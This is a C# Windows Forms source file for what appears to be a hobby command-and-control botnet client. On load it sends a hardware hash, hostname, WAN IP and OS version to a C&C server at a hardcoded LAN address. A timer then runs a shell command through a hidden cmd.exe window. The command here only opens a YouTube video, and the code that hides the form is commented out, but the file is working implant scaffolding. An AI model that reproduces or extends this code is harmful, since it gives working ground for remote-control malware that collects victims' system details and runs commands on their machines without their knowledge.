using System;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using Client.Helpers;
using System.Diagnostics;

namespace Client
{
    public partial class frmMain : Form
    {
        private string server = "http://192.168.0.38";

        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            tmrHide.Start();

            // Send hardwarehash to C&C server and connect
            var hardwareHash = CryptoHelper.GetHardwareHash();

            Thread.Sleep(500);

            string result;
            using (WebClient wc = new WebClient())
            {
                result = wc.DownloadString(server + "/connect.php?check=1&hash=" + hardwareHash);
            }

            if (result == "false")
            {
                // New connection
                using (WebClient wc = new WebClient())
                {
                    var host = EnvironmentHelper.GetHostName();
                    var ip = EnvironmentHelper.GetWanIp();
                    var os = EnvironmentHelper.GetOs();
                    var clientId = wc.DownloadString($"{server}/connect.php?new=1&hash={hardwareHash}&hostname={host}&ipaddress={ip}&os={os}");
                    lblClientId.Text = clientId;
                    tmrCommand.Start();
                }
            }
            else
            {
                // client connected before
                string clientId = result;
                lblClientId.Text = clientId;
                tmrCommand.Start();
            }
        }

        private void tmrHide_Tick(object sender, EventArgs e)
        {
            //Hide();
            tmrHide.Stop();
        }
        
        private void tmrCommand_Tick(object sender, EventArgs e)
        {
            Thread.Sleep(200);
            
            string command = "start https://www.youtube.com/watch?v=dQw4w9WgXcQ";

            ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = true;

            Process.Start(startInfo);

            tmrCommand.Stop();
        }
    }
}
